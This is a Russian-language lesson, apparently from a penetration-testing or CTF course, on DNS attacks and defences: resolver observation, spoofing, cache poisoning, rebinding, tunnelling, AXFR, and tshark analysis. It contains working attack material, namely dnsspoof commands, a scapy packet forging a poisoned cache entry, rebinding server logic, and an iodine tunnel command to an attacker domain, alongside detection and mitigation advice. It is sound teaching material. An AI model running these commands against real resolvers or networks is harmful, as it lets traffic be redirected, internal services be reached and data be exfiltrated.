## Вопрос, с которого всё начинается

Ты в локальной сети, где стоит корпоративный резолвер `10.0.0.53`, а рядом — жертва. Резолвер ходит за ответами наружу, и ты можешь это наблюдать. Вопрос урока: можно ли подсунуть резолверу ложный ответ — и что тогда произойдёт со всеми клиентами сразу.

DNS — «телефонная книга» интернета и одновременно одна из самых атакуемых служб. Разберём спуфинг, отравление кэша, rebinding и туннелирование на одном примере.

## Наш пример: наблюдаем за резолвером

Слушаем трафик резолвера наружу:

```
$ sudo tcpdump -ni eth0 -vv 'udp port 53' -c 2
10.0.0.53.54321 > 198.51.100.1.53: 12345+ A? example.com. (29)
198.51.100.1.53 > 10.0.0.53.54321: 12345 1/0/0 A 93.184.216.34
```

Вот он — запрос резолвера: **transaction ID `12345`**, **исходный порт `54321`**, имя `example.com`. Ответ придёт на ту же пару ID+порт. Это ключ ко всем DNS-атакам: тот, кто знает (или угадает) эти числа, может ответить первым.

## Шаг 1: как устроен DNS

DNS (порт 53/UDP для запросов, 53/TCP для зонных передач и крупных ответов) преобразует имена в адреса. Рекурсивный резолвер спрашивает корень → TLD → авторитетный сервер и **кэширует** ответ на время TTL. Основные записи:

| Тип | Назначение |
|---|---|
| A / AAAA | IPv4 / IPv6 адрес |
| CNAME | псевдоним |
| MX | почтовый сервер |
| NS | авторитетный сервер зоны |
| TXT | произвольный текст (SPF, DKIM) |
| SOA | параметры зоны |
| PTR | обратное преобразование |

Именно кэш — цель «отравления»: одна ложная запись надолго переживёт атаку.

## Шаг 2: спуфинг ответа

Если ты «в пути» (например, после ARP-спуфинга шлюза), достаточно ответить на запрос быстрее настоящего сервера. Проще всего это делает `dnsspoof`:

```
$ echo '10.0.0.99 example.com' > hosts.txt
$ sudo dnsspoof -i eth0 -f hosts.txt
```

Теперь жертва, запросившая `example.com`, получает наш `10.0.0.99`. Современные резолверы рандомизируют порт и ID (плюс есть DNSSEC), поэтому «слепой» off-path спуфинг сложнее, но в локальной сети связка ARP-спуфинг + DNS по-прежнему эффективна.

## Шаг 3: отравление кэша

Спуфинг можно направить не на клиента, а на **кэш резолвера**. Тогда ложную запись получат все, кто через него резолвит. Мы «в пути» и видим ID и порт — подделываем ответ быстрее легитимного:

```python
from scapy.all import *
pkt = IP(src="198.51.100.1", dst="10.0.0.53")/UDP(sport=53, dport=54321)/\
      DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname="example.com"),
          an=DNSRR(rrname="example.com", ttl=86400, rdata="10.0.0.99"))
send(pkt, iface="eth0", verbose=0)
```

Проверяем, что запись попала в кэш:

```
$ dig @10.0.0.53 example.com +short
10.0.0.99
```

Условия успеха: успеть раньше легитимного ответа, совпасть по ID, порту и имени. Атака Каминского заставляла резолвер спрашивать чаще, подбирая ID перебором, — сегодня ей противостоят рандомизация и DNSSEC.

## Шаг 4: DNS rebinding

Отдельная идея — обойти **same-origin** в браузере. Браузер жертвы резолвит `attacker.com` в IP атакующего, потом TTL истекает, и тот же домен резолвится во **внутренний** адрес (`192.168.0.1`). Домен не меняется, а запросы уходят во внутреннюю сеть — SSRF без SSRF:

```text
attacker.com. 1 IN A 203.0.113.10   # первый ответ
attacker.com. 1 IN A 192.168.0.1    # второй ответ (внутренний)
```

Защита — проверка `Host` на внутренних сервисах и DNS-pinning в браузерах.

## Шаг 5: DNS-туннель и AXFR

Если наружу разрешён только DNS, данные кодируют в поддомены (`base32.payload.attacker.com`) или в TXT. Резолвер жертвы становится «мостом» наружу:

```
$ iodine -f -P password tunnel.attacker.com
```

Признаки в PCAP — много запросов к одному домену, длинные случайные метки, крупные TXT-ответы. А самый дешёвый способ слить всю зону — попросить зонную передачу:

```
$ dig axfr @ns1.example.com example.com
```

Если AXFR разрешён — это мисконфиг, и ты получаешь полную карту домена одним запросом.

## Шаг 6: условия успеха отравления кэша

Отравление кэша кажется магией, но у него жёсткие условия. Разберём, что должно совпасть.

1. **Попасть в окно.** Ответ надо прислать раньше легитимного — обычно это единицы миллисекунд.
2. **Совпасть по четырём полям.** Transaction ID, исходный порт, имя запроса и тип. Промах по любому — ответ отброшен.
3. **Обойти рандомизацию.** Резолвер выбирает ID и порт случайно; угадать оба с первого раза почти невозможно.

Атака Каминского обошла это, заставив резолвер **сам генерировать множество запросов** к разным поддоменам атакующего, а затем заливая ответы с перебором ID — один из них попадал в цель. Именно поэтому резолверы добавили рандомизацию порта и 0x20-кодирование (случайный регистр в имени), а DNSSEC закрыл подделку криптографически.

Проверить предсказуемость резолвера можно так — посмотреть, меняются ли порт и ID между запросами:

```
$ tcpdump -ni eth0 -c 6 'udp port 53' | awk '{print $3, $5}'
```

Если исходный порт постоянный, а ID идут по порядку — резолвер предсказуем и уязвим.

## Защита DNS на практике

- **Рандомизация** ID и порта, 0x20-кодирование, DNS cookies — базовая стойкость к off-path спуфингу.
- **DNSSEC** с обязательной валидацией — защита от подделки данных.
- **DoH/DoT** — шифрует транспорт между клиентом и резолвером.
- **Egress-фильтрация** — не пускать DNS мимо корпоративного резолвера, чтобы работали политики.
- **Детект** — мониторинг аномалий: длинные поддомены, всплеск TXT, один домен с тысячами запросов.

## Шаг 7: как построить rebinding-атаку

Для rebinding нужен собственный авторитетный сервер, который **меняет ответ** между запросами: первый ответ — публичный IP (жертва подключается), затем TTL истекает и тот же домен отдаёт внутренний адрес.

Упрощённая логика (концептуально):

```python
# DNS-сервер отдаёт разную A-запись на первый и второй запрос
first = True
def handler(qname):
    global first
    if first:
        first = False
        return "203.0.113.10"   # наш внешний IP
    return "192.168.0.1"        # цель во внутренней сети
```

С очень коротким TTL (1 секунда) браузер жертвы переспросит быстро, и второй запрос уйдёт уже внутрь. Работает против SSRF-фильтров, которые проверяют IP **один раз** до запроса. Защита — DNS-pinning (браузер фиксирует первый IP) и повторная проверка резолва на стороне сервиса.

## Edge cases и подводные камни

- **DNSSEC**: подпись ломает спуфинг — проверь, включена ли (`dig +dnssec`).
- **DoH/DoT**: шифрованный DNS обходит локальный спуфинг (браузеры по умолчанию).
- **Cache pinning**: некоторые резолверы игнорируют короткие TTL — rebinding не сработает.
- **0x20 encoding**: рандомизация регистра в запросе усложняет спуфинг.

## Справочные таблицы

| Атака | Условие | Инструмент |
|---|---|---|
| Спуфинг ответа | быть в пути | dnsspoof, bettercap |
| Cache poisoning | угадать ID/порт | Kaminsky-техника |
| Rebinding | контроль DNS + TTL | собственный NS |
| Туннель | разрешён DNS | iodine, dnscat2 |
| AXFR | мисконфиг NS | dig axfr |

| Запись | Что даёт в разведке |
|---|---|
| A / AAAA | адреса, поиск origin за CDN |
| CNAME | цепочки, поиск subdomain takeover |
| MX | почтовые провайдеры |
| TXT | SPF/DKIM/DMARC, верификации |
| SRV | сервисы (AD: `_ldap._tcp`) |

Маршрут по результатам: проверь AXFR и поддомены; в локальной сети — ARP+DNS-спуфинг; для обхода firewall — DNS-туннель; для SSRF-эскалации — rebinding. Сначала определи позицию (в пути или нет) и поддержку DNSSEC/DoH — это диктует выбор атаки.

## Ложные срабатывания и OPSEC

Не путай атаку с шумом: DGA-малварь даёт случайные имена, но без ответов, а CDN — длинные поддомены без устойчивого потока к одному домену. И помни об этике: спуфинг и отравление кэша допустимы только в авторизованном тесте; в чужих сетях это правонарушение.

Отдельно про шум легитимного DNS: браузеры делают десятки запросов при загрузке одной страницы, а prefetch и CDN рандомизируют имена — это не туннель. Признак атаки — не «много запросов», а **устойчивый поток к одному домену с кодированными метками**.

## Инструмент: tshark — Wireshark в консоли

`tshark` — это Wireshark без графики: он читает дамп (`-r файл.pcap`) и печатает ровно то, что ты попросишь. Главный инструмент, когда графической оболочки нет или разбор надо автоматизировать.

Ключи, которые пригодятся:
* `-r <файл.pcap>` — читать дамп (без него tshark слушает живой интерфейс);
* `-nn` — не резолвить имена/порты: видно «как есть» и быстрее;
* `-Y '<фильтр>'` — display-фильтр, оставить только нужные пакеты (`http.request`, `dns`, `eapol`, `ospf`);
* `-T fields -e <поле>` — вместо сводки печатать значения полей (`-e ip.src -e tcp.dstport -e http.host`);
* `-q -z follow,tcp,ascii,N` — собрать TCP-поток номер N и показать его как текст.

### Рабочий пример (как в лаборатории)

```
$ tshark -r dns.pcap -Y dns -T fields -e ip.src -e dns.qry.name -e dns.a
10.0.0.53	portal.corp.local	
198.51.100.1	portal.corp.local	10.0.0.99
198.51.100.1	portal.corp.local	203.0.113.10
```

Подсказка из лаборатории: `tshark -r <pcap> [фильтр] — разбор трафика (эмуляция: вывод захвачен с реального tshark)`.

## Что мы теперь знаем

- Резолвер кэширует ответы, и кэш — цель отравления.
- Спуфинг ответа требует быть «в пути» и угадать ID + порт (или видеть их).
- Отравление кэша поражает всех клиентов резолвера сразу.
- DNS rebinding обходит same-origin и SSRF-фильтры через смену ответа.
- DNS-туннели несут данные мимо firewall; AXFR отдаёт всю зону при мисконфиге.
- Проверить резолвер просто: постоянный исходный порт и последовательные ID — признак предсказуемости.
- Основная защита — рандомизация, DNSSEC, DoH/DoT, egress-фильтрация и детект аномалий.

## Куда дальше

Мы подменили ответы и отравили кэш. Дальше разберём DNS-туннелирование подробнее — как именно данные уходят в поддоменах и TXT, и как это детектировать. А пока запомни: **DNS доверяет тому, кто ответил первым, — и этим доверием можно управлять.**

## Где пригодится

- **CTF:** DNS-задачи, эксфильтрация данных, разбор подозрительных запросов в PCAP.
- **Bug bounty:** SSRF через DNS rebinding, обход allowlist, подмена ответов.
- **Пентест:** внутренние DNS-атаки, релей и перехват в сегменте.
- **Работа (SOC/IR):** детект DNS-туннелей и отравления кэша, разбор инцидентов.
